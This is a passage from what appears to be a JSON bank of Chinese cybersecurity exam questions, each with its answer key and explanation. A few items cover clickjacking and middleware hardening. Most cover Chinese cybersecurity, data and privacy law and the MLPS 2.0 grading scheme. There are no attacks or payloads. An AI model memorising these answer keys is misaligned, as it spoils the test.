SAMEORIGIN","X-Content-Type-Options: nosniff"],"a":[0,1,2],"e":"X-Frame-Options DENY/SAMEORIGIN直接防止被嵌套；CSP frame-ancestors是更现代的标准（可配置具体允许的源）；X-Content-Type-Options是防止MIME sniffing，与点击劫持无关。"},{"c":"web","t":"m","q":"以下哪些属于\"业务逻辑漏洞\"？（多选）","o":["同一优惠券被多个并发请求重复使用","通过修改商品数量参数将数量改为负数实现\"刷单\"","验证码被暴力破解","通过修改URL参数访问他人订单（IDOR）"],"a":[0,1],"e":"同一优惠券重放和负数数量都是经典业务逻辑漏洞；验证码暴力破解属于认证安全；IDOR属于访问控制，虽然也涉及业务但OWASP单独分类。"},{"c":"web","t":"m","q":"以下哪些是中间件安全加固的有效措施？（多选）","o":["Tomcat Manager禁用或设置强口令+IP访问限制","Apache/Nginx隐藏版本号（ServerTokens Prod）","WebLogic关闭T3/IIOP协议（如果不需要JMS）","IIS关闭WebDAV扩展"],"a":[0,1,2,3],"e":"所有选项均为有效的中间件加固措施：Manager弱口令是最常见RCE入口；隐藏版本号减少信息泄露；关闭不需要的协议减小攻击面；WebDAV曾有多个漏洞（CVE-2017-7269等）。"},{"c":"law","t":"s","q":"《中华人民共和国网络安全法》正式施行的时间是（　）。","o":["2017年6月1日","2018年1月1日","2016年11月7日","2021年9月1日"],"a":0,"e":"网络安全法于2016年11月7日通过，\u003cb>2017年6月1日施行\u003c/b>，确立网络运营者义务与等级保护制度的法律地位。"},{"c":"law","t":"s","q":"《数据安全法》正式施行的时间是（　）。","o":["2021年6月10日","2021年9月1日","2021年11月1日","2020年1月1日"],"a":1,"e":"《数据安全法》2021年6月10日通过，\u003cb>2021年9月1日施行\u003c/b>，确立\u003cb>数据分类分级保护\u003c/b>、数据安全审查、数据出境管理等制度。\u003cb>时间对比\u003c/b>：网络安全法2017年6月1日施行，个人信息保护法2021年11月1日施行，密码法2020年1月1日施行。\u003cb>记忆口诀\u003c/b>：'网安17.6.1、数安21.9.1、个保21.11.1、密码20.1.1'。"},{"c":"law","t":"s","q":"《个人信息保护法》正式施行的时间是（　）。","o":["2021年9月1日","2021年11月1日","2021年8月20日","2022年1月1日"],"a":1,"e":"个人信息保护法2021年8月20日通过，\u003cb>2021年11月1日施行\u003c/b>，规范个人信息处理与跨境提供。"},{"c":"law","t":"s","q":"《密码法》正式施行的时间是（　）。","o":["2019年10月26日","2020年1月1日","2020年6月1日","2021年1月1日"],"a":1,"e":"密码法2019年10月26日通过，\u003cb>2020年1月1日施行\u003c/b>，将密码分为核心密码、普通密码、商用密码分类管理。"},{"c":"law","t":"s","q":"按照《网络安全法》要求，网络运营者留存网络日志的时间不得少于（　）。","o":["3个月","6个月","12个月","24个月"],"a":1,"e":"网络运营者应当采取监测记录网络运行状态、安全事件的技术措施，并\u003cb>留存相关网络日志不少于六个月\u003c/b>。"},{"c":"law","t":"s","q":"关键信息基础设施运营者在境内收集产生的个人信息和重要数据，应当（　）。","o":["在境内存储","自由传输至境外","加密后即可任意出境","存储位置不受限制"],"a":0,"e":"关基运营者采集的个人信息和重要数据\u003cb>应当在境内存储\u003c/b>；因业务需要向境外提供的，应当按照规定进行安全评估。"},{"c":"law","t":"s","q":"按照《密码法》，商用密码的管理方式是（　）。","o":["与核心密码一样实行严格管理","完全不受法律约束","依法管理，可相对自由地使用","仅允许国有企业使用"],"a":2,"e":"\u003cb>核心密码、普通密码\u003c/b>保护国家秘密、实行严格管理；\u003cb>商用密码\u003c/b>依法管理、可自由使用，用于保护不属于国家秘密的信息。"},{"c":"law","t":"s","q":"核心密码、普通密码用于保护（　）。","o":["商业秘密","个人隐私","国家秘密","企业内部信息"],"a":2,"e":"按《密码法》，密码分三类：\u003cb>核心密码、普通密码用于保护国家秘密\u003c/b>（核心密码保护绝密/机密/秘密级信息，普通密码保护机密/秘密级信息，均实行严格管理）；\u003cb>商用密码用于保护不属于国家秘密的信息\u003c/b>，实行'依法管理、自由使用'，如企业数据加密、HTTPS、身份认证等。\u003cb>易错点\u003c/b>：商业秘密、个人隐私属于非国家秘密，用商用密码保护。"},{"c":"law","t":"s","q":"等保2.0“一个中心、三重防护”中的“一个中心”指的是（　）。","o":["安全计算环境","安全管理中心","安全区域边界","安全通信网络"],"a":1,"e":"一个中心=\u003cb>安全管理中心\u003c/b>（态势感知、安全运营）；三重防护=安全计算环境、安全区域边界、安全通信网络。"},{"c":"law","t":"s","q":"等保2.0的“三重防护”不包括（　）。","o":["安全计算环境","安全区域边界","安全通信网络","安全管理中心"],"a":3,"e":"\u003cb>安全管理中心属于“一个中心”\u003c/b>，不在“三重防护”之内。三重防护=安全计算环境+安全区域边界+安全通信网络。"},{"c":"law","t":"s","q":"等保三级系统身份鉴别的要求是采用（　）的鉴别技术。","o":["一种最强的","两种或两种以上组合","三种以上组合","无需鉴别"],"a":1,"e":"等保2.0\u003cb>三级\u003c/b>系统身份鉴别要求采用\u003cb>两种或两种以上组合的鉴别技术\u003c/b>（双因素/多因素认证），例如口令+动态令牌、口令+指纹、口令+USBKey，且一种技术失效时仍能鉴别。\u003cb>等级差异\u003c/b>：二级要求口令+图形验证码等，强度低于三级；四级/五级要求更高。\u003cb>记忆\u003c/b>：'三级=双因素起步'；同时要求登录失败处理（锁定）、鉴别失败次数限制、口令复杂度与更换周期等。"},{"c":"law","t":"s","q":"等级保护对象定级后，应到（　）办理备案手续。","o":["网信部门","公安机关","工信部门","密码管理部门"],"a":1,"e":"等保流程为定级→\u003cb>备案（公安机关）\u003c/b>→建设整改→等级测评→监督检查，运营单位向属地公安机关备案。"},{"c":"law","t":"s","q":"等级保护工作的正确流程顺序是（　）。","o":["定级→备案→建设整改→等级测评→监督检查","定级→等级测评→备案→建设整改→监督检查","备案→定级→建设整改→等级测评→监督检查","定级→建设整改→备案→监督检查→等级测评"],"a":0,"e":"等级保护工作标准流程为\u003cb>定级→备案→建设整改→等级测评→监督检查\u003c/b>。\u003cb>各阶段要点\u003c/b>：定级=确定保护等级并编制定级报告；备案=向公安机关提交材料；建设整改=按等级要求建设防护；等级测评=测评机构开展符合性测评并出具报告；监督检查=公安机关依法监督。\u003cb>记忆口诀\u003c/b>：'定备改测查'五步走。\u003cb>易错点\u003c/b>：测评在整改之后（先建好再测），顺序不能颠倒。"},{"c":"law","t":"s","q":"等保2.0中，第二级的名称是（　）。","o":["自主保护级","指导保护级","监督保护级","强制保护级"],"a":1,"e":"等保2.0五级名称：\u003cb>一级=自主保护级、二级=指导保护级、三级=监督保护级、四级=强制保护级、五级=专控保护级\u003c/b>。\u003cb>侵害客体与程度\u003c/b>：一二级主要侵害公民法人合法权益（一级一般损害、二级严重损害）；三级起侵害社会秩序/公共利益/国家安全。\u003cb>记忆\u003c/b>：'自主指导、监督强制、专控'对应级别1-5。"},{"c":"law","t":"s","q":"等保2.0中，第三级的名称是（　）。","o":["自主保护级","指导保护级","监督保护级","专控保护级"],"a":2,"e":"等保2.0\u003cb>第三级=监督保护级\u003c/b>，适用于侵害社会秩序、公共利益、国家安全造成严重或一般损害的系统（如政务、金融、医疗等行业核心系统），是\u003cb>最常见的测评等级\u003c/b>，要求\u003cb>每年至少测评一次\u003c/b>（二级通常两年一次或按地区要求）。\u003cb>记忆\u003c/b>：'三级监督、每年测评'；三级系统还要求双因素鉴别、安全审计、入侵防范、恶意代码防范等，是等保备考重点。"},{"c":"law","t":"s","q":"信息系统受到破坏后，对社会秩序和公共利益造成严重损害，应当定为（　）。","o":["第二级","第三级","第四级","第五级"],"a":1,"e":"受侵害客体为社会秩序/公共利益/国家安全且程度为严重损害→\u003cb>第三级\u003c/b>；特别严重损害对应第四级；公民法人权益受损对应一、二级。"},{"c":"law","t":"s","q":"与等保1.0相比，等保2.0新增的保护对象不包括（　）。","o":["云平台","物联网","工控系统","个人手机相册"],"a":3,"e":"等保2.0将\u003cb>云平台、物联网、工控系统、大数据\u003c/b>等纳入保护对象；个人手机相册不属于等保定级对象。"},{"c":"law","t":"s","q":"微信突然收到好友发来的一个网络投票链接，最合理的处理方式是（　）。","o":["打电话和朋友确认不是被盗号，并确认投票原因和内容后，再酌情考虑是否投票","不投票，假装没有看到","把好友拉黑","和朋友关系很好，直接打开投票链接"],"a":0,"e":"盗号发链接是常见钓鱼手段，\u003cb>先通过其他渠道核实身份与内容\u003c/b>再行动最稳妥；直接打开可能中招，拉黑/无视则影响正常沟通。"},{"c":"law","t":"f","q":"等保2.0相比等保1.0，定级流程更严格，强调专家评审和主管部门审核，并新增了可信验证要求。","a":0,"e":"正确。等保2.0由“自主定级”升级为“专家评审、主管部门审核”，同时强调可信验证，并将风险评估纳入安全管理重要环节。"},{"c":"law","t":"s","q":"等级保护第一级系统的正确做法是（　）。","o":["自主保护，无需备案与等级测评","每年测评一次","必须部署堡垒机","必须使用国密算法"],"a":0,"e":"一级（合法权益一般损害）\u003cb>自主保护\u003c/b>即可。\u003cb>备案从二级开始\u003c/b>，三级以上需每年测评。“哪级要备案、哪级要测评”是高频考点。"},{"c":"law","t":"s","q":"信息系统受破坏后对社会秩序、公共利益造成特别严重损害，对应的保护等级是（　）。","o":["第三级","第四级","第五级","第二级"],"a":1,"e":"\u003cb>特别严重损害→第四级（强制保护级）\u003c/b>。注意区分：五级（专控保护级）的受侵害客体\u003cb>仅限国家安全\u003c/b>。三级对应“严重损害”，分级对照表要背熟。"},{"c":"law","t":"s","q":"等级保护第三级系统的测评频率要求是（　）。","o":["每年至少开展一次等级测评","每三年一次","无需测评","每五年一次"],"a":0,"e":"等保2.0要求\u003cb>第三级以上网络的运营者每年至少开展一次等级测评\u003c/b>，第四级从严执行。发现问题的还需制定整改计划并闭环。"},{"c":"law","t":"s","q":"等级测评应由（　）实施。","o":["具备资质的第三方测评机构","运营单位自己随便盖章","任何软件公司","设备厂商"],"a":0,"e":"等级测评由\u003cb>具备测评资质的第三方测评机构\u003c/b>实施，运营使用单位配合，公安机关监督。自查与厂商测试不能替代法定测评。"},{"c":"law","t":"s","q":"商用密码应用安全性评估的简称是（　）。","o":["密评","等评","风险评估","渗透测试"],"a":0,"e":"\u003cb>密评\u003c/b>依据《密码法》与GB/T 39786标准，检验国密算法应用的正确性与有效性；关基与三级以上系统等需按规开展，与等保测评相互衔接配合。"},{"c":"law","t":"s","q":"关键信息基础设施保护工作的统筹协调部门是（　）。","o":["国家网信部门","公安机关","市场监督管理部门","商务部门"],"a":0,"e":"\u003cb>国家网信部门统筹协调\u003c/b>关基保护；行业主管监管部门（如工信部）负责行业监督管理，公安机关负责安全保卫与违法查处，密码管理部门负责密码应用监管——多方协同。"},{"c":"law","t":"s","q":"下列不属于《网络安全法》确立的制度的是（　）。","o":["网络安全等级保护制度","关键信息基础设施保护制度","网络实名制（信息发布等服务需验证真实身份）","所有互联网数据一律境内存储"],"a":3,"e":"网安法确立了等保、关基保护、监测预警与应急处置、网络实名制等制度。\u003cb>“所有数据必须本地化”并非网安法要求\u003c/b>——数据境内存储仅针对关键信息基础设施运营者收集的个人信息和重要数据。"},{"c":"law","t":"s","q":"处理个人信息应遵循的核心原则是（　）。","o":["合法、正当、必要和诚信","越全越好、永久保存","先收集后告知","付费即可豁免"],"a":0,"e":"原则包括\u003cb>合法正当必要诚信、目的限定、最小范围、公开透明\u003c/b>等：不得过度收集，须充分告知并取得同意。“最小必要”是贯穿个保法的核心思想。"},{"c":"law","t":"s","q":"数据分类分级中，对核心数据的管理要求是（　）。","o":["实行更加严格的管理制度","与一般数据完全相同","无需特别管理","仅企业内部约定即可"],"a":0,"e":"《数据安全法》将数据分为一般、重要、核心三级：\u003cb>核心数据关系国家安全与国民经济命脉，实行更严格管理\u003c/b>；重要数据出境须安全评估；分类分级是数据安全治理的基础。"},{"c":"law","t":"s","q":"数据出境的三条合规路径是（　）。","o":["安全评估、保护认证、标准合同","口头承诺、行业惯例、内部审批","加密后随意传输","境外法优先"],"a":0,"e":"向境外提供个人信息的合规路径：\u003cb>申报数据出境安全评估、个人信息保护认证、订立标准合同\u003c/b>。路径选择取决于主体身份（关基）、数据类型（重要数据）与数量规模。"},{"c":"law","t":"s","q":"下列不属于“可靠电子签名”条件的是（　）。","o":["签名制作数据专属于签名人","签署时由签名人控制","签名后任何改动能够被发现","必须使用国密SM2算法"],"a":3,"e":"《电子签名法》规定的条件：专有、签署时仅签名人控制、\u003cb>签名与文件内容被篡改均能被发现\u003c/b>——技术路线不限（国密或国际算法均可），通常结合CA证书与可信时间戳实现。"},{"c":"law","t":"s","q":"刑法第285条“非法侵入计算机信息系统罪”针对的系统是（　）。","o":["国家事务、国防建设、尖端科学技术领域","所有企业官网","个人博客","游戏服务器"],"a":0,"e":"侵入\u003cb>国家事务、国防建设、尖端科学技术领域\u003c/b>三类系统即构成犯罪，\u003cb>无需造成任何后果\u003c/b>；侵入普通系统则需“获取数据”或“情节严重”才构成相应罪名——体现对重点对象的特殊保护。"},{"c":"law","t":"s","q":"下列不属于刑法第286条“破坏计算机信息系统罪”行为的是（　）。","o":["删除、修改、增加、干扰系统功能致其不能正常运行","故意制作传播计算机病毒等破坏性程序","对系统内数据、应用程序进行删除修改增加","未经授权访问但不影响系统运行"],"a":3,"e":"286条要求造成\u003cb>后果严重\u003c/b>：破坏功能、破坏数据程序、制作传播病毒三类行为；单纯访问未造成影响的不是286行为（可能构成285相关罪名）。“删库跑路”即典型286。"},{"c":"law","t":"s","q":"帮助信息网络犯罪活动罪（帮信罪）的行为是（　）。","o":["明知他人利用信息网络实施犯罪，仍提供技术支持、广告推广、支付结算等帮助","无意中点了恶意链接","被黑客攻击的受害者","网络服务中断的管理员"],"a":0,"e":"帮信罪（刑法287条之二）：出租出售银行卡与“四件套”、跑分、为诈骗团伙提供服务器/推广等均属之。\u003cb>切勿出租出借个人账户\u003c/b>——它已成为发案量最大的网络犯罪之一。"},{"c":"law","t":"f","q":"等级保护第二级及以上的系统应到公安机关办理备案手续。","a":0,"e":"正确。\u003cb>备案自第二级起\u003c/b>（运营后30日内向属地公安机关备案），一级自主保护、不强制备案与测评。流程顺序：定级→备案→建设整改→等级测评→监督检查。"},{"c":"law","t":"s","q":"《关键信息基础设施安全保护条例》正式施行的日期是（　）。","o":["2021年6月1日","2021年9月1日","2022年1月1日","2020年1月1日"],"a":1,"e":"条例2021年7月30日公布，\u003cb>2021年9月1日施行\u003c/b>，作为网络安全法的配套行政法规，细化了关基的认定规则、运营者责任义务与保护工作部门职责。注意与《网络安全法》（2017-6-1）、《数据安全法》（2021-9-1）同日施行的区分记忆。"},{"c":"law","t":"s","q":"按照《关键信息基础设施安全保护条例》，运营者开展网络安全检测和风险评估的频率要求是（　）。","o":["每五年一次","每三年一次","每年至少一次","无需定期评估"],"a":2,"e":"\u003cb>关基运营者应当每年至少进行一次网络安全检测和风险评估\u003c/b>，对问题及时整改并报送保护工作部门。配套义务还包括：主要负责人负总责、设置专门安全管理机构、优先采购安全可信产品、可能影响国家安全的采购申报网络安全审查。"},{"c":"law","t":"s","q":"《数据安全法》确立的核心管理制度是（　）。","o":["等级保护制度","数据分类分级保护制度","实名认证制度","备案制度"],"a":1,"e":"\u003cb>数据分类分级：按重要程度分类分级保护\u003c/b>，国家核心数据实行更严格管理，重要数据目录由各地区各部门确定；重要数据处理者应定期开展风险评估并报送。分类是按属性划类，分级是按影响定级。"},{"c":"law","t":"s","q":"下列不属于敏感个人信息的是（　）。","o":["生物识别信息","医疗健康信息","行踪轨迹","个人电子邮箱地址"],"a":3,"e":"法定敏感个人信息包括：\u003cb>生物识别、宗教信仰、特定身份、医疗健康、金融账户、行踪轨迹，以及不满十四周岁未成年人的个人信息\u003c/b>等。一般邮箱地址属普通个人信息。处理敏感信息需“特定目的+充分必要性+严格保护措施”并取得单独同意。"},{"c":"law","t":"s","q":"处理敏感个人信息应当取得的同意形式是（　）。","o":["口头同意","单独同意","默示同意","一揽子授权"],"a":1,"e":"\u003cb>敏感个人信息处理须取得单独同意\u003c/b>（还需充分告知必要性及影响）；向第三方提供、公开个人信息、向境外提供、处理生物识别信息等情形同样需要单独同意，且不得以捆绑方式一揽子取得。"},{"c":"law","t":"s","q":"下列不属于《个人信息保护法》规定的个人信息跨境提供合法路径的是（　）。","o":["通过国家网信部门安全评估","经专业机构个人信息保护认证","按国家网信部门制定的标准合同与境外接收方订立合同","公司自行评估后直接传输"],"a":3,"e":"合法出境三路径：\u003cb>安全评估、保护认证、标准合同\u003c/b>。触发申报安全评估的情形包括：关基运营者出境、处理100万人以上个人信息、累计向境外提供10万人个人信息或1万人敏感个人信息等（以最新办法为准）。关基还有境内存储要求。"},{"c":"law","t":"s","q":"《个人信息保护法》对自动化决策的要求是（　）。","o":["完全禁止自动化决策","不得对个人在交易价格等交易条件上实行不合理差别待遇（禁止大数据杀熟），保证决策透明度与公平合理","自动化决策无需任何约束","仅限制政府部门使用"],"a":1,"e":"\u003cb>禁止大数据杀熟\u003c/b>：自动化决策应保证透明度和结果公平、公正，不得不合理差别对待；个性化推送应提供不针对个人特征的选项或拒绝方式；对个人权益有重大影响的决定，个人有权要求说明并拒绝。"},{"c":"law","t":"s","q":"下列不属于个人信息主体权利的是（　）。","o":["查阅、复制其个人信息","请求更正、补充、删除","请求转移其个人信息（可携带权）","随时进入处理者机房检查服务器"],"a":3,"e":"个人享有\u003cb>知情、决定、查阅复制、可携带、更正补充、删除、要求解释说明\u003c/b>等权利，处理者应建立便捷的受理机制，不得设置不合理条件。D显然超出个人权利范围；造成损害时可依法请求赔偿。"},{"c":"law","t":"s","q":"关基运营者采购网络产品和服务，可能影响国家安全的，应当（　）。","o":["直接采购并保密","申报网络安全审查","只需内部审批","委托个人代购"],"a":1,"e":"\u003cb>可能影响国家安全的采购应申报网络安全审查\u003c/b>（《网络安全审查办法》），审查关注产品供应连续性、供应链安全与数据出境风险；掌握大量用户信息的平台赴国外上市也属于申报情形。供应链安全是关基保护重点。"},{"c":"law","t":"s","q":"刑法第285条“非法侵入计算机信息系统罪”针对的系统对象是（　）。","o":["所有联网计算机","国家事务、国防建设、尖端科学技术领域的计算机信息系统","个人电脑","企业官网"],"a":1,"e":"\u003cb>仅限国家事务、国防建设、尖端科技领域三类系统\u003c/b>，侵入即入罪（无需后果）；侵入普通系统不构成本罪，但非法获取计算机信息系统数据、非法控制等另有罪名。情节严重的处三年以下，特别严重处三年以上七年以下。"},{"c":"law","t":"s","q":"“删库跑分”、破坏数据致系统瘫痪的行为最可能触犯的罪名是（　）。","o":["破坏计算机信息系统罪","盗窃罪","危险驾驶罪","职务侵占罪"],"a":0,"e":"\u003cb>刑法第286条破坏计算机信息系统罪\u003c/b>：违反规定对系统功能进行删除、修改、增加、干扰，造成系统不能正常运行，或破坏数据与应用程序，后果严重即入罪。运维红线：任何未授权删改生产数据、发起流量攻击致瘫均可涉刑。"},{"c":"law","t":"s","q":"明知他人利用信息网络实施犯罪，仍提供互联网接入、服务器托管、广告推广、支付结算等帮助的行为构成（　）。","o":["正当商业行为","帮助信息网络犯罪活动罪（帮信罪）","无罪","仅民事违约"],"a":1,"e":"\u003cb>帮信罪\u003c/b>：出租出售银行卡与“四件套”、跑分、提供推广/结算帮助情节严重的，处三年以下有期徒刑或拘役。对运维人员的警示：帮人“挂马”、出租服务器给诈骗团伙、“维护”赌博网站均属犯罪链条。"},{"c":"law","t":"s","q":"网络安全等级保护第三级系统的测评周期要求是（　）。","o":["每两年一次","每年至少一次","每五年一次","仅在上线时测评一次"],"a":1,"e":"\u003cb>三级及以上系统每年至少开展一次等级测评\u003c/b>，高风险问题限期整改；四级系统测评要求更严。同时要求安全设施与业务系统“同步规划、同步建设、同步使用”（三同步），新建系统上线前完成定级备案与测评整改。"},{"c":"law","t":"s","q":"网络运营者未履行等级保护义务的，首先面临的法律责任是（　）。","o":["直接吊销营业执照","由主管部门责令改正、给予警告；拒不改正或造成危害后果的处以罚款","追究刑事责任","查封全部设备"],"a":1,"e":"\u003cb>先责令改正+警告；拒不改正或导致危害网络安全等后果的，对运营者处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款\u003c/b>（网安法第59条）。等保是法定义务而非可选项，未定级备案本身即违规。"},{"c":"law","t":"s","q":"按照《密码法》要求，关键信息基础设施应当（　）。","o":["仅使用进口密码产品","使用商用密码进行保护并开展商用密码应用安全性评估","不使用任何密码","密码方案对外公开"],"a":1,"e":"\u003cb>关基必须使用商用密码保护，同步规划、建设、运行密码保障措施，并自行或委托机构开展密评\u003c/b>。商用密码实行检测认证制度；核心密码、普通密码用于保护国家秘密，与商用密码场景不同。"},{"c":"law","t":"s","q":"下列不属于《电子签名法》规定的可靠电子签名条件的是（　）。","o":["签名制作数据专属于签名人所有","签署时签名制作数据仅由签名人控制","签署后对签名及数据电文内容的任何改动能够被发现","必须由第三方CA机构现场见证签署过程"],"a":3,"e":"可靠电子签名四要件：\u003cb>数据专有、签署时仅签名人控制、签名与内容被改动均能发现\u003c/b>。满足条件即与手写签名或盖章具有同等法律效力；CA证书是实现可靠电子签名的常见技术手段，但“现场见证”不是法定要件。"},{"c":"law","t":"s","q":"发生网络安全事件时，网络运营者应当（　）。","o":["立即删除相关日志避免追责","立即启动应急预案，采取补救措施，并按照规定向有关主管部门报告","先对外发布澄清公告","等待媒体报道后再处理"],"a":1,"e":"\u003cb>立即启动应急预案、采取补救措施（留存证据），并按规定向主管部门报告\u003c/b>，瞒报本身面临处罚。重大网络安全事件需按分级标准上报；对内应留存日志配合溯源，对外通报要经授权统一出口。"},{"c":"law","t":"s","q":"ISO/IEC 27001标准的体系思想是（　）。","o":["关注技术防护","基于PDCA循环建立、实施、维护和持续改进信息安全管理体系（ISMS）","关注产品安全","仅适用于政府机构"],"a":1,"e":"\u003cb>ISO 27001是信息安全管理体系（ISMS）的国际标准\u003c/b>，基于PDCA循环：Plan（风险评估与处理计划）、Do（实施控制措施）、Check（内部审核与管理评审）、Act（纠正改进）。覆盖14个控制域、114项控制措施。与等保互补：等保是合规底线，ISO 27001是体系化提升。"},{"c":"law","t":"s","q":"等保2.0中“一个中心三重防护”架构的“一个中心”是指（　）。","o":["防火墙管理中心","安全管理中心（态势感知与集中管控）","数据中心","网络交换中心"],"a":1,"e":"\u003cb>一个中心=安全管理中心：集中管控安全策略、统一审计、态势感知、安全运营\u003c/b>；三重防护=安全通信网络（传输加密/网络架构）+安全区域边界（边界防护/访问控制/入侵防范）+安全计算环境（身份鉴别/访问控制/安全审计/数据完整性）。这是等保2.0的安全架构总纲。"},{"c":"law","t":"s","q":"数据出境安全评估的申报主体不包括（　）。","o":["关键信息基础设施运营者","处理100万人以上个人信息的处理者","仅处理少量普通个人信息的个体工商户","处理重要数据的处理者"],"a":2,"e":"\u003cb>需要申报数据出境安全评估的情形（摘要）\u003c/b>：关基运营者向境外提供个人信息或重要数据；处理100万人以上个人信息的数据处理者向境外提供个人信息；累计向境外提供10万人敏感个人信息或100万人一般个人信息等。小规模个体工商户不触发强制评估。"},{"c":"law","t":"s","q":"个人信息处理者违反《个人信息保护法》情节严重的，最高可处（　）罚款。","o":["100万元","5000万元或上一年度营业额的5%","1亿元","10万元"],"a":1,"e":"\u003cb>违法处理个人信息情节严重的，处五千万元以下或者上一年度营业额百分之五以下罚款\u003c/b>，并可责令暂停相关业务、吊销许可。同时对直接负责的主管人员和其他直接责任人处十万元以上一百万元以下罚款，可决定禁止其在一定期限内担任相关企业董监高。"},{"c":"law","t":"s","q":"网络安全等级保护定级备案的主管部门是（　）。","o":["工信部","公安机关","网信办","市场监管局"],"a":1,"e":"\u003cb>第二级及以上系统运营者到所在地设区的市级以上公安机关网安部门备案\u003c/b>。备案材料：定级报告、备案表、专家评审意见（三级及以上）。备案是法律义务，未备案属于违规。公安机关负责监督检查，行业主管部门负责行业指导和监督。"},{"c":"law","t":"s","q":"国家标准GB/T 22239属于（　）。","o":["密码技术标准","网络安全等级保护基本要求","个人信息保护标准","软件工程标准"],"a":1,"e":"\u003cb>GB/T 22239是等保2.0的核心标准“网络安全等级保护基本要求”\u003c/b>（2021年发布新版），定义了各级安全技术要求和安全管理要求。配套标准：GB/T 25070（安全设计要求）、GB/T 28448（测评要求）、GB/T 25058（实施指南）。等保2.0形成了“基本要求+其他标准”的完整体系。"},{"c":"law","t":"s","q":"网络安全等级保护第四级系统的定级对象侵害客体是（　）。","o":["公民合法权益","社会秩序、公共利益和国家安全","仅国家安全","仅社会秩序"],"a":1,"e":"\u003cb>四级（强制保护级）受侵害客体为社会秩序、公共利益和国家安全，侵害程度为特别严重损害\u003c/b>。五级（专控保护级）侵害客体仅为国家安全，侵害程度为特别严重损害。三级的侵害程度是严重损害或一般损害（覆盖面广但程度相对轻于四级）。"},{"c":"law","t":"s","q":"网络运营者收集个人信息的基本原则是（　）。","o":["尽可能多地收集以备后用","合法、正当、必要，且经个人同意","无需告知收集目的","可以不经同意收集敏感信息"],"a":1,"e":"\u003cb>最小必要原则：收集个人信息应限于实现处理目的的最小范围，不得过度收集\u003c/b>。《个人信息保护法》要求：告知收集目的、方式和范围；获取个人同意；目的变更需重新同意；不得以个人不同意收集为由拒绝提供基础服务。"},{"c":"law","t":"s","q":"关于网络安全审查，以下说法正确的是（　）。","o":["只有国外企业才需要审查","掌握大量个人信息赴国外上市的运营者应申报网络安全审查","网络安全审查不影响数据安全","审查通过后终身有效"],"a":1,"e":"\u003cb>网络安全审查关注数据出境风险和供应链安全\u003c/b>。掌握超过100万用户个人信息的运营者赴国外上市须申报；采购重要网络产品和服务可能影响国家安全也须申报。审查并非禁止上市或采购，而是评估和管控风险。审查结果有有效期，持续运营仍需合规。"},{"c":"law","t":"s","q":"等保测评中，三级系统应满足的“双因素”要求是指（　）。","o":["两台服务器互备","身份鉴别采用两种或两种以上组合的鉴别技术","两个防火墙串联","两种备份方式"],"a":1,"e":"\u003cb>三级安全计算环境中要求：身份鉴别采用两种或两种以上组合的鉴别技术进行身份鉴别\u003c/b>（如口令+动态令牌、口令+生物识别等）。注意区分“两种技术”不是“两个口令”。这是等保三级的硬性技术要求之一，测评不合格项必须整改。"},{"c":"law","t":"f","q":"等保二级系统不需要向公安机关备案，只需内部自行定级即可。","a":1,"e":"错误。第二级及以上信息系统运营者均应到所在地设区的市级以上公安机关网安部门备案。备案是法定义务，未备案属于违反《网络安全法》行为，可能面临责令改正和罚款。"},{"c":"law","t":"f","q":"个人信息处理者可以将收集到的个人信息随意共享给其他企业，只要双方签订协议即可。","a":1,"e":"错误。向其他个人信息处理者提供个人信息，必须取得个人的单独同意（敏感信息）或告知并取得同意，且需签订协议明确双方责任。共享后的接收方还需遵守最小必要原则，不得超出原收集目的范围使用。"},{"c":"law","t":"s","q":"网络安全法规定，网络关键设备和网络安全专用产品销售前必须（　）。","o":["自行检测","经认证机构认证合格","用户试用合格","不需要任何手续"],"a":1,"e":"\u003cb>网络关键设备和网络安全专用产品须经认证机构认证合格后方可销售或提供\u003c/b>（网安法第23条）。目的是确保进入市场的安全产品满足最低安全标准。企业采购安全设备时应查验认证证书。"},{"c":"law","t":"s","q":"网络安全法规定，网络运营者应当制定网络安全事件应急预案，并（　）。","o":["对外保密","定期演练","每年向公众公布","不需要演练"],"a":1,"e":"\u003cb>网安法第25条要求网络运营者制定网络安全事件应急预案\u003c/b>，并定期演练。预案应包含：事件分级标准、响应流程、角色分工、联系方式、技术处置手册、外部通报流程等。纸上预案不做演练等于没有预案。"},{"c":"law","t":"s","q":"《数据安全法》规定，国家建立数据安全工作协调机制，统筹协调数据安全工作。","o":["错误","正确","数据安全不需要国家层面协调","由企业自行决定"],"a":1,"e":"\u003cb>国家建立数据安全工作协调机制\u003c/b>，由中央网信办统筹协调各地区各部门数据安全工作。数据安全法与网络安全法、个人信息保护法共同构成中国数据保护领域的三驾马车。"},{"c":"law","t":"s","q":"个人信息处理者处理个人信息不应遵循的原则是（　）。","o":["合法正当必要原则","目的限制原则","处理数量越多越好原则","最小必要原则"],"a":2,"e":"\u003cb>个保法要求：合法正当必要诚信、目的明确合理、最小必要、公开透明、质量准确完整、安全保障、责任可追溯\u003c/b>等原则。过度收集个人信息既违法又增加泄露风险和合规处罚。"},{"c":"law","t":"s","q":"等保2.0相比等保1.0的最大扩展是（　）。","o":["只适用于政府机构","扩展覆盖云计算、物联网、工业控制系统、移动互联网、大数据等新技术新应用","仅适用于金融行业","取消了五级分类"],"a":1,"e":"\u003cb>等保2.0新增\u003c/b>：云计算安全、物联网安全、工业控制系统安全、移动互联网安全、大数据安全等扩展领域。每个扩展领域都有独立的安全要求，体现了等级保护随技术演进而发展。"},{"c":"law","t":"s","q":"个人信息保护影响评估报告应当至少保存（　）。","o":["1个月","3年","1年","不需要保存"],"a":1,"e":"\u003cb>个保法第55条规定个人信息保护影响评估报告应当至少保存三年\u003c/b>。评估报告是合规审计的重要证据。需要开展PIA的情形：处理敏感个人信息、自动化决策、向第三方提供、向境外提供个人信息等。"},{"c":"law","t":"s","q":"等保定级依据的信息系统受侵害客体不包括（　）。","o":["国家安全","公民、法人和其他组织的合法权益","企业的财务利润（作为直接侵害客体）","社会秩序、公共利益"],"a":2,"e":"\u003cb>等保定级客体：国家安全、社会秩序和公共利益、公民/法人/其他组织的合法权益\u003c/b>。企业财务利润影响属于间接评估因素，不是法定的侵害客体。定级依据是受侵害客体+侵害程度两个维度。"},{"c":"law","t":"s","q":"《电子签名法》规定可靠的电子签名与手写签名具有（　）。","o":["不同的法律效力","同等的法律效力","更高的法律效力","没有法律效力"],"a":1,"e":"\u003cb>可靠的电子签名与手写签名或盖章具有同等法律效力\u003c/b>（电子签名法第14条）。满足可靠条件即可：签名制作数据专有、签署时仅由签名人控制、签名和内容改动可发现。"},{"c":"law","t":"s","q":"关基运营者的个人信息和重要数据原则上应在（　